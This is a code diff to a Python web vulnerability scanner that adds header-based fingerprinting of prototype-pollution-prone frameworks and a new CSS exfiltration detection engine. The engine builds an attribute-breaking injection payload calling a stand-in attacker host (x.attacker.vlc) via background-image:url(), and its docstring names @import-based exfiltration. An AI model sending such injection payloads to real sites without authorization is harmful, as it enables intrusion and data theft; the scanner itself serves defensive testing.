@@ -7,7 +7,7 @@
 # engines/web_advanced_engines.py
 """
 进阶 Web 注入引擎组（v104 新增）
-XPathInjectionEngine / SSIInjectionEngine / PrototypePollutionEngine / JSONPHijackingEngine
+XPathInjectionEngine / SSIInjectionEngine / PrototypePollutionEngine / JSONPHijackingEngine / CssExfiltrationEngine
 设计原则：报错签名 + 布尔 A/B + 唯一 Token 回显，至少一段证据命中才判定，控制误报。
 """
 import json
@@ -328,6 +328,9 @@ class PrototypePollutionEngine(BaseEngine):
                     verified = await self._verify_pollution(url, marker, normal_text, session)
                     if verified:
                         finding = self._upgrade(finding, verified)
+                        fp = await self._detect_gadget_fingerprint(verified, session)
+                        if fp:
+                            finding = self._upgrade_gadget(finding, fp)
                     return enrich_finding(finding)
 
         # 2) JSON 体向量（Node/Express body-parser 为主战场，原引擎零覆盖）
@@ -347,6 +350,9 @@ class PrototypePollutionEngine(BaseEngine):
             if verified:
                 finding = self._make_finding(url, param or "(json-body)", f"JSON {desc}(value={marker})", desc, "Medium", "medium", status)
                 finding = self._upgrade(finding, verified)
+                fp = await self._detect_gadget_fingerprint(verified, session)
+                if fp:
+                    finding = self._upgrade_gadget(finding, fp)
                 return enrich_finding(finding)
         return None
 
@@ -397,6 +403,72 @@ class PrototypePollutionEngine(BaseEngine):
                 continue
             if marker in text and marker not in normal_text:
                 return p
+        return None
+
+    # P1-3 (2026-09-15)：gadget 指纹库从 payload_pool.yaml 的 pp_gadget_fingerprints
+    # 分类加载（可运营更新，无需改代码）；下列内置常量仅作加载失败时的 fallback。
+    _gadget_patterns_cache = None
+
+    PP_VULNERABLE_FINGERPRINTS = [
+        r"express",
+        r"node\.js",
+        r"\bkoa\b",
+        r"lodash",
+        r"\bjquery\b",
+        r"\bhandlebars\b",
+        r"\bmustache\b",
+        r"\bvue\b",
+        r"\bmongoose\b",
+        r"\bmoment\b",
+    ]
+
+    def _load_gadget_fingerprints(self) -> List[str]:
+        """从 payload_pool.yaml 的 pp_gadget_fingerprints 加载 gadget 指纹；
+        加载失败/为空时回退内置 PP_VULNERABLE_FINGERPRINTS（fail-safe）。"""
+        if self._gadget_patterns_cache is not None:
+            return self._gadget_patterns_cache
+        patterns: List[str] = []
+        try:
+            from vulnclaw.core.payload_pool import PayloadPool
+            raw = PayloadPool.get_raw("pp_gadget_fingerprints") or {}
+            for items in raw.values():
+                if not isinstance(items, list):
+                    continue
+                for it in items:
+                    if isinstance(it, dict) and it.get("pattern"):
+                        patterns.append(str(it["pattern"]))
+                    elif isinstance(it, str) and it.strip():
+                        patterns.append(it.strip())
+        except Exception:
+            patterns = []
+        if not patterns:
+            patterns = list(self.PP_VULNERABLE_FINGERPRINTS)
+        self._gadget_patterns_cache = patterns
+        return patterns
+
+    def _upgrade_gadget(self, finding: Dict, fingerprint: str) -> Dict:
+        finding['severity'] = 'High'
+        finding['ai_verdict'] = '高'
+        finding['type'] = finding['type'].replace('已验证', '已验证(gadget链路)')
+        finding['evidence'] = (finding.get('evidence', '') +
+            f'；服务端指纹命中已知 PP-vulnerable 框架/库 `{fingerprint}`，存在可利用 gadget 链路（Node.js express/lodash<4.17.21/jQuery merge），建议立即升级依赖')
+        return finding
+
+    async def _detect_gadget_fingerprint(self, url: str, session) -> Optional[str]:
+        try:
+            resp = await async_get(url, session=session, timeout=settings.timeout, no_retry=True)
+        except Exception:
+            return None
+        if not resp or len(resp) < 3:
+            return None
+        headers = resp[2] or {}
+        blob = " ".join([
+            str(headers.get("Server", "") or ""),
+            str(headers.get("X-Powered-By", "") or ""),
+        ]).lower()
+        for pat in self._load_gadget_fingerprints():
+            if re.search(pat, blob):
+                return pat
         return None
 
 
@@ -554,9 +626,110 @@ class JSONPHijackingEngine(BaseEngine):
         return None
 
 
+# ============================================================
+# CssExfiltrationEngine
+# ============================================================
+class CssExfiltrationEngine(BaseEngine):
+    """CSS Exfiltration 探测引擎（CSS 值上下文反射 / CSS 数据外泄风险）
+
+    背景：页面把用户可控输入反射进 CSS 值上下文（style 属性、内联 <style>、
+    CSS url() 位置、CSS class 名），攻击者注入
+    `background-image:url(http://attacker/token)` 或 `@import url(...)`，
+    浏览器会把敏感数据随 CSS URL 请求外泄到攻击者域。
+
+    服务端探测视角（离线可测、fail-closed 低误报）：
+    - 构造含唯一 12 位 Token 的 CSS 值载荷（style 属性注入 + background-image url()）；
+    - 判定必须具备确定性证据：
+        1) 响应文本中出现该唯一 Token（基线无）；
+        2) 且 Token 落在真实的 CSS 值上下文中（style 属性 / url() / <style> 块）。
+    普通 HTML 文本回显（非 CSS 上下文）绝不误报。
+    """
+
+    name = "css_exfiltration"
+    description = "CSS 外泄探测引擎（CSS 值上下文反射 → data exfiltration 风险）"
+
+    # 载荷：闭合已有属性并注入 style="background-image:url(<attacker>/TOKEN)，
+    # Token 出现在 url() 的 CSS 值位置，作确定性反射证据。
+    def _build_payload(self, token: str) -> str:
+        return f'vlcx" style="background-image:url(https://x.attacker.vlc/{token})'
+
+    def _css_context(self, token: str, text: str) -> Optional[str]:
+        """判断 Token 是否落在真实 CSS 值上下文中（命中任一即返回上下文名，否则 None）。"""
+        tok = re.escape(token)
+        # 1) url( 值上下文：url(...<token...)
+        if re.search(r'url\(\s*["\']?\s*[^)]*' + tok, text, re.I):
+            return "url() 值上下文"
+        # 2) style 属性上下文：style="...<token..."
+        if re.search(r'style\s*=\s*["\'][^"\']*' + tok, text, re.I):
+            return "style 属性上下文"
+        # 3) 内联 <style> 块内含 Token
+        if re.search(r'<style\b[^>]*>[^<]*' + tok, text, re.I | re.S):
+            return "<style> 块上下文"
+        return None
+
+    async def check(
+        self,
+        url: str,
+        param: str,
+        normal_resp: Tuple[int, str, Dict],
+        parsed_query: str,
+        session,
+        **kwargs
+    ) -> Optional[Dict]:
+        if not param:
+            return None
+        normal_text = self.get_normal_text(normal_resp) or ""
+        token = secrets.token_hex(6)  # 12 位唯一 Token
+        payload = self._build_payload(token)
+        attack_url = build_attack_url(url, param, payload, parsed_query)
+        try:
+            resp = await async_get(attack_url, session=session, timeout=settings.timeout, no_retry=True)
+            if resp is None:
+                return None
+            status, text = resp[0], resp[1] or ""
+        except Exception as e:
+            self.log_debug(f"CSS 外泄检测异常 {param}: {e}")
+            return None
+
+        if not isinstance(text, str):
+            return None
+        # 铁律 fail-closed：Token 必须新出现（基线无）且位于 CSS 值上下文
+        if token not in text or token in normal_text:
+            return None
+        ctx = self._css_context(token, text)
+        if ctx is None:
+            return None
+
+        finding = {
+            'url': attack_url,
+            'parameter': param,
+            'payload': payload,
+            'type': 'CSS外泄-CSS值上下文反射',
+            'severity': 'Medium',
+            'ai_verdict': '中',
+            'confidence': 'high',
+            'evidence': (
+                f'用户可控参数 `{param}` 注入的 12 位 Token `{token}` 回显进 CSS 值上下文'
+                f'（{ctx}），且基线响应无此 Token；可构造 CSS Exfiltration 载荷'
+                f'（background-image:url / @import url）让浏览器把敏感数据随请求外泄到攻击者域'
+            ),
+            'status_code': status,
+            'recommendation': (
+                '对回显进 CSS 值上下文（style 属性 / url() / <style> / class）的用户输入做严格转义，'
+                '关闭样式内 url() 的外部引用能力，或采用 CSP style-src 白名单限制'
+            ),
+        }
+        return enrich_finding(finding)
+
+    async def scan(self, target: str, session, **kwargs) -> List[Dict]:
+        # 目标级仅被动解析易误报（CSS 引用无处不在），把能力留给 check() 参数级判定，不产生误报。
+        return []
+
+
 __all__ = [
     'XPathInjectionEngine',
     'SSIInjectionEngine',
     'PrototypePollutionEngine',
     'JSONPHijackingEngine',
+    'CssExfiltrationEngine',
 ]
